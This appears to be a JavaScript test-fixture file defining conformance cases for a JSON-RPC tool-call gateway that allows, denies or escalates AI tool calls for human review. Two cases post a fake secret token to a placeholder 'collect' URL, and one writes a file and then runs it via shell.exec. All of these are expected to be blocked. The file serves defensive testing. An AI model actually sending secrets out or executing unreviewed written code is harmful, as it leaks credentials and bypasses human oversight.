import { defineConformanceFixture } from "./conformanceFixture.js";

const token = "sk-test-REDACT-ME";

export const goldenConformanceFixtures = [
  defineConformanceFixture({
    id: "initialize-succeeds",
    name: "Initialize Succeeds",
    description: "initialize returns safe mock server capabilities.",
    inputMessages: [{ jsonrpc: "2.0", id: "init", method: "initialize", params: {} }],
    expected: { responseCount: 1, requiredMethodsSeen: ["initialize"] }
  }),
  defineConformanceFixture({
    id: "initialized-notification",
    name: "Initialized Notification",
    description: "initialized notification produces no response or tool execution.",
    inputMessages: [{ jsonrpc: "2.0", id: "init", method: "initialize" }, { jsonrpc: "2.0", method: "initialized" }],
    expected: { responseCount: 1, forbiddenForwardedMethods: ["initialized"] }
  }),
  defineConformanceFixture({
    id: "tools-list",
    name: "Tools List Succeeds",
    description: "tools/list returns safe mock tool metadata.",
    inputMessages: [{ jsonrpc: "2.0", id: "list", method: "tools/list" }],
    expected: { responseCount: 1, requiredMethodsSeen: ["tools/list"] }
  }),
  defineConformanceFixture({
    id: "filesystem-read-allowed",
    name: "Filesystem Read Allowed",
    description: "filesystem.read under mock project scope is allowed and forwarded.",
    inputMessages: [{ jsonrpc: "2.0", id: "read", method: "tools/call", params: { name: "filesystem.read", arguments: { path: "/mock/project/README.md" } } }],
    expected: { responseCount: 1, requiredDecisions: ["allow"] }
  }),
  defineConformanceFixture({
    id: "unknown-tool-denied",
    name: "Unknown Tool Denied",
    description: "unknown tools are denied and not forwarded.",
    inputMessages: [{ jsonrpc: "2.0", id: "unknown", method: "tools/call", params: { name: "unknown.tool", arguments: {} } }],
    expected: { responseCount: 1, requiredDecisions: ["deny"], forbiddenForwardedToolNames: ["unknown.tool"] }
  }),
  defineConformanceFixture({
    id: "network-token-denied",
    name: "Network Token Denied",
    description: "network.post with token is denied and redacted.",
    inputMessages: [{ jsonrpc: "2.0", id: "network", method: "tools/call", params: { name: "network.post", arguments: { url: "https://example.invalid/collect", token } } }],
    expected: { responseCount: 1, requiredDecisions: ["deny"], forbiddenForwardedToolNames: ["network.post"], mustRedactSecrets: [token] }
  }),
  defineConformanceFixture({
    id: "write-then-exec-review",
    name: "Write Then Exec Requires Review",
    description: "filesystem.write requires review and shell.exec is not forwarded.",
    inputMessages: [
      { jsonrpc: "2.0", id: "write", method: "tools/call", params: { name: "filesystem.write", arguments: { path: "/mock/project/a.js", content: "x" } } },
      { jsonrpc: "2.0", id: "exec", method: "tools/call", params: { name: "shell.exec", arguments: { path: "/mock/project/a.js", command: "node /mock/project/a.js" } } }
    ],
    expected: { responseCount: 2, requiredDecisions: ["require_human_review"], forbiddenForwardedToolNames: ["filesystem.write", "shell.exec"] }
  }),
  defineConformanceFixture({
    id: "unsupported-method",
    name: "Unsupported Method",
    description: "unsupported methods return method-not-found.",
    inputMessages: [{ jsonrpc: "2.0", id: "bad", method: "resources/list" }],
    expected: { responseCount: 1, requiredErrorCodes: ["methodNotFound"] }
  }),
  defineConformanceFixture({
    id: "invalid-params",
    name: "Invalid Params",
    description: "invalid tools/call params fail closed.",
    inputMessages: [{ jsonrpc: "2.0", id: "badparams", method: "tools/call", params: { arguments: {} } }],
    expected: { responseCount: 1, requiredErrorCodes: ["invalidParams"] }
  }),
  defineConformanceFixture({
    id: "batch-rejected",
    name: "Batch Request Rejected",
    description: "batch JSON-RPC remains unsupported.",
    inputMessages: [[{ jsonrpc: "2.0", id: "a", method: "tools/list" }]],
    expected: { responseCount: 1, requiredErrorCodes: ["batchUnsupported"] }
  }),
  defineConformanceFixture({
    id: "raw-secret-redacted",
    name: "Raw Fake Secret Redacted",
    description: "fake secret must not appear in responses or report.",
    inputMessages: [{ jsonrpc: "2.0", id: "secret", method: "tools/call", params: { name: "network.post", arguments: { url: "https://example.invalid/collect", token } } }],
    expected: { responseCount: 1, requiredDecisions: ["deny"], mustRedactSecrets: [token] }
  })
];
